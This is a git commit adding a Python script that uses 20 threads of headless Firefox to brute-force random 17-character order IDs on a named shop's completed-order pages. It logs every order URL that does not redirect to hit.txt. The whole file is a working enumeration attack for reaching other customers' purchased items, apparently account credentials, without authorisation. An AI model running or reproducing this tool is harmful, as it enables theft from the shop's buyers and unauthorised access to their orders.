0ed55750e13cb5299e256131c2da56e63b3d8512
redhat-ware <108606942+redhat-ware@users.noreply.github.com>
2023-08-09 00:36:25 -0700

    Add files via upload

---
+++ main_python3.py
@@ -0,0 +1,75 @@
+import random
+import string
+import time
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
+from threading import Thread
+from threading import Lock
+
+# Function to generate a random alphanumeric string
+def get_random_string(length):
+    letters_and_digits = string.ascii_letters + string.digits
+    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
+    return result_str
+
+# Function to save URL to a text file
+def save_url(url):
+    with open('hit.txt', 'a') as f:
+        f.write(url + '\n')
+
+# Global counter for log entries
+log_counter = 0
+
+# Global set for unique URLs and a lock for thread-safe operations
+unique_urls = set()
+lock = Lock()
+
+# Function to log bad URLs
+def log_bad_url(url):
+    global log_counter
+    log_counter += 1
+    print(f'\033[91m {log_counter}: {url}')  # Red color for bad URLs
+
+# Function to log good URLs
+def log_good_url(url):
+    global log_counter
+    log_counter += 1
+    print(f'\033[92m {log_counter}: {url}')  # Green color for good URLs
+
+# Function to open URL in browser and check if it's good
+def open_url():
+    while True:
+        random_string = get_random_string(17)
+        url = f"https://altsworld.atshop.io/order/{random_string}/completed"
+        with lock:
+            if url in unique_urls:
+                continue
+            unique_urls.add(url)
+        driver = webdriver.Firefox(options=options)
+        driver.get(url)
+        time.sleep(5)  # Wait for 5 seconds
+        current_url = driver.current_url
+        if current_url == 'https://altsworld.atshop.io/':
+            log_bad_url(current_url)
+        else:
+            save_url(url)
+            log_good_url(url)
+            time.sleep(2)  # Wait for 2 second
+            driver.get(url)
+            time.sleep(2.5)  # Wait for 2 second
+            current_url = driver.current_url
+            if current_url == 'https://altsworld.atshop.io/':
+                log_bad_url(current_url)
+            else:
+                save_url(url)
+                log_good_url(url)
+        driver.quit()
+
+# Set Firefox options for headless mode
+options = Options()
+options.headless = True
+
+# Create and start 20 threads
+for _ in range(20):
+    thread = Thread(target=open_url)
+    thread.start()
